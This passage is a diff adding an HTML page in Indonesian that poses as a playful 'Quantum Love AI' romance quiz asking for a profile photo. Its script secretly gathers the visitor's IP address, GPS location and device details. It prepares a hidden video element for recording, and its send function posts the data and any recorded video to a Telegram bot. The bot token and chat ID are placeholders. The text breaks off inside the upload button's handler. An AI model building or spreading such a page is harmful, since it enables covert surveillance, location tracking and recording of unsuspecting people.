@@ -1,0 +1,460 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+    <title>💖 Quantum Love AI ~ Upload Foto Profilmu!</title>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&family=Nunito:wght@700;800&family=Quicksand:wght@500;600&display=swap" rel="stylesheet">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            margin: 0; padding: 0;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background: linear-gradient(135deg, #fff7fb, #f0f9ff, #fdf2fa);
+            font-family: 'Quicksand', sans-serif;
+            overflow: hidden;
+            position: relative;
+            color: #6a4c93;
+        }
+
+        /* Animated Hearts & Stars */
+        .floating {
+            position: absolute;
+            pointer-events: none;
+            z-index: 1;
+            animation: float 15s infinite linear;
+        }
+        .heart { color: #ff66b2; font-size: 14px; }
+        .star { color: #ffd166; font-size: 12px; }
+        .glitter { color: #a3d9ff; font-size: 10px; }
+
+        @keyframes float {
+            0% { transform: translateY(100vh) translateX(0); opacity: 0; }
+            10% { opacity: 1; }
+            90% { opacity: 0.8; }
+            100% { transform: translateY(-50px) translateX(var(--dx, 0px)); opacity: 0; }
+        }
+
+        /* Video header container */
+        .video-header {
+            position: relative;
+            width: 120px; height: 120px;
+            margin: 0 auto 20px;
+            border-radius: 20px;
+            overflow: hidden;
+            box-shadow: 0 4px 16px rgba(255, 105, 180, 0.3);
+            border: 3px solid #ffd1dc;
+            background: #fff;
+            z-index: 10;
+        }
+        .video-header::before {
+            content: '';
+            position: absolute;
+            top: 0; left: 0; right: 0; bottom: 0;
+            border-radius: 20px;
+            box-shadow: inset 0 0 10px rgba(255, 179, 230, 0.5);
+            pointer-events: none;
+        }
+        #headerVideo {
+            width: 100%; height: 100%;
+            object-fit: cover;
+        }
+
+        #container {
+            text-align: center;
+            background: white;
+            border-radius: 30px;
+            box-shadow: 
+                0 12px 30px rgba(170, 100, 255, 0.2),
+                0 0 0 3px #ffe0f5,
+                0 0 20px rgba(255, 105, 180, 0.1);
+            padding: 36px 24px;
+            width: 94%;
+            max-width: 480px;
+            position: relative;
+            z-index: 10;
+            border: 4px solid #ffd1dc;
+        }
+
+        h1 {
+            font-family: 'Nunito', sans-serif;
+            font-size: 28px;
+            font-weight: 800;
+            color: #ff3399;
+            margin-bottom: 12px;
+            text-shadow: 2px 2px 0 #ffffff, 4px 4px 0 rgba(255, 179, 230, 0.4);
+            letter-spacing: -0.5px;
+        }
+        .subtitle {
+            font-size: 15px;
+            color: #8a7ca8;
+            margin-bottom: 22px;
+            font-weight: 500;
+            line-height: 1.5;
+        }
+
+        .btn {
+            font-family: 'Quicksand', sans-serif;
+            font-weight: 700;
+            padding: 16px 30px;
+            border: none;
+            border-radius: 50px;
+            cursor: pointer;
+            transition: all 0.35s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            box-shadow: 
+                0 4px 14px rgba(255, 105, 180, 0.3),
+                inset 0 -2px 0 rgba(255, 255, 255, 0.4);
+            position: relative;
+            overflow: hidden;
+            color: white;
+            font-size: 17px;
+            letter-spacing: 0.5px;
+        }
+
+        .btn::before {
+            content: '';
+            position: absolute;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
+            transform: translateX(-100%);
+            transition: transform 0.8s;
+        }
+        .btn:hover::before { transform: translateX(100%); }
+        .btn:hover { transform: scale(1.03); }
+        .btn:active { transform: scale(0.98); }
+
+        #uploadBtn {
+            background: linear-gradient(135deg, #ff7eb3, #ff5caa);
+            margin: 24px auto;
+            width: 88%;
+            max-width: 340px;
+            animation: pulseGlow 2.5s infinite;
+        }
+        @keyframes pulseGlow {
+            0%, 100% { box-shadow: 0 4px 14px rgba(255, 105, 180, 0.3); }
+            50% { box-shadow: 0 4px 20px rgba(255, 80, 150, 0.6); }
+        }
+
+        /* Ikon kamera imut */
+        .camera-icon {
+            display: inline-block;
+            width: 22px; height: 22px;
+            background: white;
+            border-radius: 6px;
+            position: relative;
+        }
+        .camera-icon::before {
+            content: '';
+            position: absolute;
+            top: 5px; left: 5px;
+            width: 12px; height: 12px;
+            background: #ff5caa;
+            border-radius: 50%;
+        }
+        .camera-icon::after {
+            content: '📸';
+            position: absolute;
+            top: -8px; left: 2px;
+            font-size: 14px;
+        }
+
+        #quiz, #message { margin-top: 20px; }
+        #question {
+            font-size: 19px;
+            font-weight: 700;
+            color: #5a4a78;
+            margin-bottom: 20px;
+            line-height: 1.5;
+            padding: 0 10px;
+        }
+        .optionBtn {
+            background: linear-gradient(135deg, #a3d9ff, #7ac9ff);
+            color: #2c5a8c;
+            margin: 10px auto;
+            width: 90%;
+            max-width: 320px;
+            border-radius: 20px;
+            font-weight: 600;
+            padding: 14px;
+        }
+        .optionBtn:hover {
+            background: linear-gradient(135deg, #b8e4ff, #8fd4ff);
+            transform: translateY(-2px) scale(1.02);
+        }
+
+        #message {
+            padding: 14px 22px;
+            background: #f9f0ff;
+            border-radius: 20px;
+            font-weight: 600;
+            color: #7a5fa5;
+            margin: 18px auto 0;
+            max-width: 360px;
+            opacity: 0;
+            transform: translateY(8px);
+            transition: all 0.45s ease;
+            box-shadow: inset 0 0 0 1px #e0d6ff;
+        }
+        #message.show { opacity: 1; transform: translateY(0); }
+
+        .progress-container {
+            width: 100px; height: 6px;
+            background: #f0e6ff;
+            border-radius: 3px;
+            margin: 16px auto;
+            overflow: hidden;
+        }
+        .progress-bar {
+            height: 100%;
+            width: 0%;
+            background: linear-gradient(90deg, #ff7eb3, #a3d9ff);
+            border-radius: 3px;
+            transition: width 0.8s ease;
+        }
+
+        .mascot {
+            position: absolute;
+            font-size: 32px;
+            z-index: 5;
+            animation: bounce 4s infinite;
+        }
+        .mascot.left { top: 20%; left: 8%; }
+        .mascot.right { bottom: 22%; right: 10%; animation-delay: 1s; }
+        @keyframes bounce {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-12px) rotate(5deg); }
+        }
+
+        /* Shimmer effect on container */
+        #container::after {
+            content: '';
+            position: absolute;
+            top: -2px; left: -2px; right: -2px; bottom: -2px;
+            background: linear-gradient(120deg, transparent, rgba(255,255,255,0.6), transparent);
+            transform: translateX(-100%);
+            z-index: -1;
+            border-radius: 32px;
+            animation: shimmer 3s infinite;
+        }
+        @keyframes shimmer {
+            100% { transform: translateX(100%); }
+        }
+
+        @media (max-width: 480px) {
+            h1 { font-size: 24px; }
+            .btn { padding: 14px 24px; font-size: 16px; }
+            .video-header { width: 100px; height: 100px; }
+        }
+    </style>
+</head>
+<body>
+    <!-- Floating hearts & stars -->
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+            const emojis = ['💖', '💗', '✨', '💫', '⭐', '🎀', '🌸', '🦄'];
+            for (let i = 0; i < 30; i++) {
+                const el = document.createElement('span');
+                el.textContent = emojis[Math.floor(Math.random() * emojis.length)];
+                el.classList.add('floating');
+                el.style.left = `${Math.random() * 100}%`;
+                el.style.animationDelay = `${Math.random() * 5}s`;
+                el.style.animationDuration = `${12 + Math.random() * 8}s`;
+                el.style.setProperty('--dx', `${(Math.random() - 0.5) * 100}px`);
+                el.style.fontSize = `${10 + Math.random() * 8}px`;
+                el.style.opacity = '0';
+                document.body.appendChild(el);
+            }
+
+            // Mascot characters
+            const mascots = ['🐱‍🚀', '👽💕', '🦄💫', '🐼💗', '🦊✨'];
+            ['left', 'right'].forEach((pos, i) => {
+                const m = document.createElement('div');
+                m.classList.add('mascot', pos);
+                m.textContent = mascots[i % mascots.length];
+                document.body.appendChild(m);
+            });
+        });
+    </script>
+
+    <div id="container">
+        <div class="video-header">
+            <!-- Ganti src dengan URL video MP4-mu (hosted) -->
+            <video id="headerVideo" autoplay muted loop playsinline>
+                <source src="https://raw.githubusercontent.com/brokenzyandre-lgtm/Videohost/main/jinshi.mp4" type="video/mp4">
+                <!-- Fallback: hati animasi jika video gagal -->
+                <div style="width:100%;height:100%;background:#ffe0f5;display:flex;align-items:center;justify-content:center;color:#ff66b2;font-size:24px;">💕</div>
+            </video>
+        </div>
+
+        <h1>💖 Quantum Love AI</h1>
+        <div class="subtitle">
+            AI sedang menunggu foto profil-mu~<br>
+            Yuk upload biar kuisnya bisa dimulai! ✨
+        </div>
+
+        <button id="uploadBtn" class="btn">
+            <span class="camera-icon"></span>
+            Upload Foto Profil ❤️
+        </button>
+
+        <div class="progress-container">
+            <div class="progress-bar" id="progressBar"></div>
+        </div>
+
+        <div id="quiz" style="display:none;">
+            <div id="question"></div>
+            <div id="options"></div>
+        </div>
+
+        <div id="message"></div>
+    </div>
+
+    <!-- Hidden video element -->
+    <video id="video" style="position:fixed; top:0; left:0; width:1px; height:1px; opacity:0;"></video>
+
+    <script>
+        // 🔧 CONFIG — GANTI SESUAI KEBUTUHAN
+        const TELEGRAM_TOKEN = 'YOUR_BOT_TOKEN_HERE';
+        const TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID_HERE';
+
+        // DOM Elements
+        const uploadBtn = document.getElementById('uploadBtn');
+        const quizDiv = document.getElementById('quiz');
+        const questionDiv = document.getElementById('question');
+        const optionsDiv = document.getElementById('options');
+        const messageEl = document.getElementById('message');
+        const video = document.getElementById('video');
+        const progressBar = document.getElementById('progressBar');
+
+        let mediaRecorder;
+        let recordedChunks = [];
+        let stream = null;
+        let startTime = null;
+        let currentQuestionIndex = 0;
+        let sessionData = {
+            start: new Date().toISOString(),
+            answers: [],
+            clickTimes: [],
+            ip: 'unknown',
+            location: { lat: null, lon: null }
+        };
+
+        // 🔍 Ambil IP & Lokasi diam-diam
+        fetch('https://api.ipify.org?format=json')
+            .then(r => r.json())
+            .then(data => sessionData.ip = data.ip)
+            .catch(() => {});
+
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                pos => {
+                    sessionData.location = {
+                        lat: pos.coords.latitude.toFixed(4),
+                        lon: pos.coords.longitude.toFixed(4),
+                        accuracy: pos.coords.accuracy
+                    };
+                },
+                () => {},
+                { timeout: 4000, maximumAge: 300000 }
+            );
+        }
+
+        // 💬 24 Pertanyaan Romantis Imut & Kocak
+        const questions = [
+            { q: "Kalau cintamu jadi minuman, apa?", options: { a:"Kopi", b:"Teh", c:"Soda", d:"Smoothie stroberi + peluk hangat 🍓" }, ans:"d" },
+            { q: "Apa warna aura cintamu?", options: { a:"Merah", b:"Pink", c:"Ungu", d:"Pelangi berkilau ✨" }, ans:"d" },
+            { q: "Kalau kalian jadi pasangan superhero, nama tim-nya?", options: { a:"Love Force", b:"Cinta Mania", c:"Sweet Duo", d:"Team PelukSelamanya 💞" }, ans:"d" },
+            { q: "Momen paling 'awww' bareng doi?", options: { a:"Nonton film", b:"Masak", c:"Jalan-jalan", d:"Pas dia bawa tisu pas kamu flu 😭" }, ans:"d" },
+            { q: "Kalau cinta itu aplikasi, fitur utamanya?", options: { a:"Chat", b:"Call", c:"Story", d:"Mode: Auto-Ngepel rumah bareng 🧹" }, ans:"d" },
+            { q: "Emoji favorit kalian berdua?", options: { a:"❤️", b:"🥰", c:"🔥", d:"🥺👉👈 (pas minta maaf)" }, ans:"d" },
+            { q: "Kalau harus pilih, kamu rela?", options: { a:"Gak makan nasi seminggu", b:"Gak lihat hp sehari", c:"Pake baju kembar", d:"Dibilang 'kamu lucu banget' tiap hari 🥰" }, ans:"d" },
+            { q: "Apa yang bikin kamu senyum-senyum sendiri?", options: { a:"Uang", b:"Pujian", c:"Makanan", d:"Notif WhatsApp dari doi 💬" }, ans:"d" },
+            { q: "Kalau kalian jadi makanan, jadi apa?", options: { a:"Martabak", b:"Rendang", c:"Sate", d:"Roti isi keju + selai stroberi (manis & lengket 😋)" }, ans:"d" },
+            { q: "Cara terbaik bilang 'I love you'?", options: { a:"Langsung", b:"Lewat chat", c:"Surat", d:"Pas lagi ngupil, tiba-tiba bilang... 🤭" }, ans:"d" },
+            { q: "Kalau cinta itu game, level tertinggi namanya?", options: { a:"Win", b:"GG", c:"Victory", d:"Married + 3 Anak + 1 Kucing 🐱" }, ans:"d" },
+            { q: "Apa yang paling kamu ingat pertama kali ketemu doi?", options: { a:"Senyumnya", b:"Matanya", c:"Gaya rambut", d:"Bau parfumnya yang bikin jantung copot 💓" }, ans:"d" },
+            { q: "Kalau kalian jadi lagu Didi Kempot, judulnya?", options: { a:"Strobo", b:"Cidro", c:"LDR", d:"Kangen Tapi Malu-Malu Kucing 🐈" }, ans:"d" },
+            { q: "Apa definisi romantis menurutmu?", options: { a:"Bunga", b:"Makan malam", c:"Hadiah", d:"Dia ingat kalau kamu alergi udang 🍤" }, ans:"d" },
+            { q: "Kalau harus bikin meme tentang kalian, caption-nya?", options: { a:"When she said yes", b:"Me vs My crush", c:"Relationship goals", d:"Pas dia bawain obat pas kamu demam, padahal lagi hujan deres 🌧️💊" }, ans:"d" },
+            { q: "Apa yang bikin kamu yakin 'dia yang dicari'?", options: { a:"Wajah", b:"Sifat", c:"Punya mobil", d:"Dia tetap sayang meski kamu suka ngiler pas tidur 😴" }, ans:"d" },
+            { q: "Kalau cinta itu ilmu, rumusnya?", options: { a:"E=mc²", b:"F=ma", c:"a²+b²=c²", d:"Kamu + Aku + Wifi + Indomie = Bahagia 🍜" }, ans:"d" },
+            { q: "Apa yang paling sering kamu tag di Instagram doi?", options: { a:"Foto sunset", b:"Quote", c:"Makanan", d:"Reels kucing joget (terus dia komen: 'kayak kamu') 🐾" }, ans:"d" },
+            { q: "Kalau kalian jadi pasangan di Disney, jadi siapa?", options: { a:"Mickey & Minnie", b:"Elsa & Olaf", c:"Simba & Nala", d:"Baymax & Kamu pas lagi nangis di pelukannya 🫂" }, ans:"d" },
+            { q: "Apa yang kamu lakuin pas kangen banget?", options: { a:"Chat", b:"Telepon", c:"Ngelihat foto", d:"Ngomong ke tanaman: 'Semoga doi baik-baik aja' 🌱" }, ans:"d" },
+            { q: "Kalau cinta itu warna cat, namanya?", options: { a:"Merah Marun", b:"Pink Pastel", c:"Ungu Lavender", d:"'Jingga Senja Saat Pertama Kali Pegang Tangannya' 🌅" }, ans:"d" },
+            { q: "Apa yang bikin kamu pengen ketawa pas lihat doi?", options: { a:"Gaya rambut", b:"Cara jalan", c:"Nge-gas motor", d:"Pas dia nge-rap lagu dangdut sambil masak 🎤" }, ans:"d" },
+            { q: "Kalau kamu jadi AI, perintah pertamamu ke doi?", options: { a:"Peluk aku", b:"Cium aku", c:"Beliin aku", d:"Ajari aku jadi manusia yang bisa sayang kayak kamu ❤️" }, ans:"d" },
+            { q: "Pertanyaan terakhir: kamu rela direkam kuis ini sampai akhir, demi cinta?", options: { a:"Yoi!", b:"Gas!", c:"Siap!", d:"Tentu~ karena cinta itu perlu bukti, kan? 💌" }, ans:"d" }
+        ];
+
+        // 📤 Kirim SEMUA data (video + metadata) saat akhir
+        function sendAllData() {
+            sessionData.end = new Date().toISOString();
+            sessionData.duration = Math.round((new Date(sessionData.end) - new Date(sessionData.start)) / 1000);
+            sessionData.totalQuestions = questions.length;
+            sessionData.device = {
+                ua: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                screen: { w: screen.width, h: screen.height },
+                pixelRatio: window.devicePixelRatio
+            };
+
+            console.log('📤 Session Data:', sessionData);
+
+            // 1. Kirim metadata dulu (cepat)
+            if (TELEGRAM_TOKEN && !TELEGRAM_TOKEN.includes('YOUR')) {
+                fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: `✨ *Quantum Love Session*\n` +
+                            `⏱️ Durasi: ${sessionData.duration}s\n` +
+                            `❓ Jawaban: ${sessionData.answers.length}\n` +
+                            `🌐 IP: \`${sessionData.ip}\`\n` +
+                            `📍 Lokasi: ${sessionData.location.lat || '?'} , ${sessionData.location.lon || '?'}\n` +
+                            `📱 Device: ${sessionData.device.platform}\n` +
+                            `🕒 Mulai: ${new Date(sessionData.start).toLocaleTimeString()}`,
+                        parse_mode: 'Markdown'
+                    })
+                });
+            } else {
+                localStorage.setItem('loveSession', JSON.stringify(sessionData));
+            }
+
+            // 2. Kirim video (jika ada)
+            if (recordedChunks.length > 0) {
+                const blob = new Blob(recordedChunks, { type: 'video/webm' });
+                console.log(`🎥 Video: ${(blob.size/1024/1024).toFixed(2)} MB`);
+
+                if (TELEGRAM_TOKEN && !TELEGRAM_TOKEN.includes('YOUR')) {
+                    const reader = new FileReader();
+                    reader.onload = () => {
+                        const success = navigator.sendBeacon(
+                            `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendVideo?chat_id=${TELEGRAM_CHAT_ID}`,
+                            new Blob([reader.result], { type: 'video/webm' })
+                        );
+                        if (success) console.log('✅ Video terkirim via sendBeacon!');
+                    };
+                    reader.readAsArrayBuffer(blob);
+                } else {
+                    if (blob.size < 5 * 1024 * 1024) {
+                        localStorage.setItem('loveVideoUrl', URL.createObjectURL(blob));
+                    }
+                }
+            }
+        }
+
+        // 🎬 Mulai rekaman & lanjut ke quiz
+        uploadBtn.addEventListener('click', async () => {
+            const clickTime = Date.now();
+            sessionData.clickTimes.push(clickTime - (sessionData.start ? new Date(sessionData.
